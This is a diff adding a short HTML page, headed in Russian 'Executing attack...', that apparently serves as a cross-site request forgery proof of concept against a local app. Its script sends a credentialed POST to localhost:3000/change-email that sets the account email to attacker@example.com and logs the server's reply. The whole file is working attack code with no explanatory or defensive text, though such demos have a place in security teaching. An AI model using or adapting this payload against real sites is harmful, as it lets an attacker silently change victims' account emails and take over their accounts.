@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head><title>XSS + CSRF</title></head>
+<body>
+  <h2>⚠️ Выполнение атаки...</h2>
+
+  <script>
+    fetch('http://localhost:3000/change-email', {
+      method: 'POST',
+      body: new URLSearchParams({ email: 'attacker@example.com' }),
+      credentials: 'include'
+    }).then(res => res.text())
+     .then(text => console.log('Ответ сервера:', text))
+     .catch(err => console.error('Ошибка:', err));
+  </script>
+</body>
+</html>
